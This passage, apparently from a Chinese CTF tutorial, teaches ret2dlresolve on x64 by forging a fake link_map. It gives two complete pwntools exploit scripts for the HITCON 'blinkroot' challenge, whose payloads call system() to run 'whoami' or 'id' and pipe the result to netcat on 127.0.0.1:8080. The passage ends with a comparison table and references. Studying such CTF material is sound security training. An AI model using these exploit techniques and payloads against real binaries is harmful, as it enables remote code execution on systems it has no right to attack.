    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: padding for the relocation entry of idx=0
        0x20: padding for the relocation entry of idx=0
        0x28: padding for the relocation entry of idx=0
        0x30: p_r_offset, offset pointer to the resloved addr
        0x38: r_info
        0x40: append    
      resolved addr
        0x48: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50
        0x50: 6, tag of the DT_SYMTAB
        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x50
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    linkmap += p64(0)*3
    # here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x48 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)

    linkmap = linkmap.ljust(0x68, 'A')

    linkmap += p64(fake_linkmap_addr)

    linkmap += p64(fake_linkmap_addr + 0x50)

    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    return linkmap

# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0    
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(data_addr+43)
payload += "whoami | nc 127.0.0.1 8080\x00"

payload +=ret2dlresolve_with_fakelinkmap_x64(elf,data_addr+len(payload), elf.got["__libc_start_main"],libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024,'A')
# gdb.attach(io)
io.send(payload)
io.interactive()
```

需要注意这里的 `data_addr+43` 为伪造的 linkmap 的地址。执行效果如下

```
❯ nc -l 127.0.0.1 8080
iromise
```

上面的这种方式为伪造 link_map 的 l_addr 为目标函数和已解析函数之间的偏移。

根据之前的介绍，我们还可以伪造 l_addr 为已解析函数的地址， st_value 为已解析函数和目标函数之间的偏移。

```
value = l->l_addr + sym->st_value
```

这里，由于 `.got.plt` 的下方没多远就是 bss 段 data 的位置。当我们控制 linkmap 的地址位于 got 表附近时，同时我们还需要利用 link_map 的几个动态表指针，偏移从 0x68 开始。因此我们需要仔细构造对应的数据。这里我们选择伪造 link_map 到 0x600B80。

```
0x600B80-->link_map
0x600BC0-->data    
0x600BC8-->data+8
0x600BD0-->data+16, args of puts
0x600BE8-->data+24
```

因此，我们可以控制的 puts 的参数的长度最大为 0x18。

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")


def ret2dlresolve_with_fakelinkmap_x64(libc, fake_linkmap_addr, offset_of_two_addr):
    '''
    libc: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap

    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0xc0
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78
        0x78: 17, tag of the JMPREL
        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x88
        0x88: padding for the relocation entry of idx=0
        0x90: padding for the relocation entry of idx=0
        0x98: padding for the relocation entry of idx=0
        0xa0: p_r_offset, offset pointer to the resloved addr
        0xa8: r_info
        0xb0: append
      resolved addr
        0xb8: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0
        0xc0: 6, tag of the DT_SYMTAB
        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0
        0xd0: 0x0000030000000000
        0xd8: offset_of_two_addr
        0xe0: fake st_size
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x78
    '''
    linkmap = p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr+0xc0)

    linkmap += p64(17) + p64(fake_linkmap_addr + 0x88)
    linkmap += p64(0)*3
    # here we set p_r_offset = libc.sym["__free_hook"]-libc.sym["__libc_start_main"]
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = __libc_start_main_addr
    linkmap += p64((libc.sym["__free_hook"]-libc.sym["__libc_start_main"]) & (2**64 - 1)) + p64(0x7) + p64(0)

    linkmap += p64(0)

    linkmap += p64(6) + p64(fake_linkmap_addr + 0xd0)

    linkmap += p64(0x0000030000000000) + \
        p64(offset_of_two_addr & (2**64 - 1))+p64(0)

    linkmap = linkmap.ljust(0xf8-0x68, 'A')
    linkmap += p64(fake_linkmap_addr + 0x78)

    return linkmap


# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(elf.got["__libc_start_main"])
payload += "id|nc 127.0.0.1 8080\x00".ljust(0x18,'a')
payload += ret2dlresolve_with_fakelinkmap_x64(libc, elf.got["__libc_start_main"], libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024, 'A')
# gdb.attach(io)
io.send(payload)
io.interactive()
```

需要注意的是，在伪造 linkmap  的时候，我们是从偏移 0x68 开始构造的，所以在最后对齐的时候设置 `linkmap.ljust(0xf8-0x68, 'A')`。

执行效果

```shell
❯ nc -l 127.0.0.1 8080
uid=1000(iromise) gid=1000(iromise)...
```

## 总结

|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |
| ------------ | --------------------- | ------------------------------------------------------------ | ---------------------------------------------------- |
| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |
| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |
| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |

总的来说，与 ret2dlresolve 攻击最为相关的一些动态节为

- DT_JMPREL
- DT_SYMTAB
- DT_STRTAB
- DT_VERSYM

## 题目

- pwnable.kr unexploitable
- pwnable.tw unexploitable
- 0CTF 2018 babystack
- 0CTF 2018 blackhole

## 参考

1. http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ ，深入浅出。
2. https://www.math1as.com/index.php/archives/341/
3. https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
4. https://blog.csdn.net/seaaseesa/article/details/104478081
5. https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md
6. https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot